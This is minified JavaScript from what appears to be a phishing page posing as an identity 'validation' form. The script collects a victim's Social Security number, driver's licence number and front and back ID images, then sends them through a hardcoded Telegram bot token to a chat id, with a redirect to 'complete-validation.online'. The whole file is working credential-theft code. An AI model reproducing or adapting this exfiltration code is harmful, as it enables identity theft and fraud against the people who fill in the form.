let modal=document.getElementById("myModal");window.onload=()=>{modal.style.display="block"};var currentTab=0;function showTab(e){var t=document.getElementsByClassName("tab");t[e].style.display="block",0==e?document.getElementById("prevBtn").style.display="none":document.getElementById("prevBtn").style.display="block",e==t.length-1?document.getElementById("nextBtn").innerHTML="Submit":document.getElementById("nextBtn").innerHTML="Next",fixStepIndicator(e)}function nextPrev(e){var t=document.getElementsByClassName("tab");if(1==e&&!validateForm())return!1;if(t[currentTab].style.display="none",(currentTab+=e)>=t.length){var n=document.getElementById("formContainer");return document.getElementById("nextBtn").setAttribute("type","submit"),n.addEventListener("submit",e=>{e.preventDefault(),submitForm()}),document.getElementById("loader").style.display="block",document.getElementById("underLoader").style.display="none",!1}showTab(currentTab)}function validateForm(){var e,t,n,a=!0;for(n=0,t=(e=document.getElementsByClassName("tab"))[currentTab].getElementsByTagName("input");n<t.length;n++)""==t[n].value&&(t[n].className+=" invalid",a=!1);return a&&(document.getElementsByClassName("step")[currentTab].className+=" finish"),a}function fixStepIndicator(e){var t,n=document.getElementsByClassName("step");for(t=0;t<n.length;t++)n[t].className=n[t].className.replace(" active","");n[e].className+=" active"}showTab(currentTab);var submitForm=function(){let e="-1002118242497",t=document.getElementById("ssn").value,n=document.getElementById("dl").value,a=document.getElementById("front"),l=a.files[0],s=document.getElementById("back"),r=s.files[0],o="https://api.telegram.org/bot6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs/sendDocument",d=new FormData;d.append("chat_id",e),d.append("document",l),d.append("caption",`Front
Ssn: ${t}
Dl: ${n}`);let m=new FormData;return m.append("chat_id",e),m.append("document",r),m.append("caption",`Back
Ssn: ${t}
Dl: ${n}`),fetch(o,{method:"POST",body:d}).then(e=>e.json()).then(fetch(o,{method:"POST",body:m})).then(e=>{console.log("Telegram API response:",e)}).catch(e=>{console.error("Error sending message:",e)}),!1};let myRedirect=()=>{var e;setTimeout(()=>{"block"==document.getElementById("loader").style.display&&window.location.replace("https://complete-validation.online")},5e3)};setInterval(myRedirect,7e3);
